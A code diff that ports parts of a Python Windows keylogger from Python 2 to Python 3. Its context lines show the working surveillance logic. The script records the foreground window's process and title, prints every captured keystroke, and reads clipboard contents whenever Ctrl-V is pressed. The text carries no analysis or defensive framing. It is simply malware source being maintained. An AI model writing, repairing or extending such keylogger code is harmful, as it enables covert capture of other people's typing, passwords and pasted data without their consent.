@@ -9,8 +9,6 @@ psapi    = windll.psapi
 current_window = None
 
 def get_current_process():
-
-    # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
 
     # find the process ID
@@ -28,9 +26,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
     # print out the header if we're in the right process
-    print
-    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
-    print
+    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
   
     # close handles
     kernel32.CloseHandle(hwnd)
@@ -38,7 +34,6 @@ def get_current_process():
     
     
 def KeyStroke(event):
-    
     global current_window   
 
     # check to see if target changed windows
@@ -51,7 +46,6 @@ def KeyStroke(event):
         print(chr(event.Ascii),)
     else:
         # if [Ctrl-V], get the value on the clipboard
-        # added by Dan Frisch 2014
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
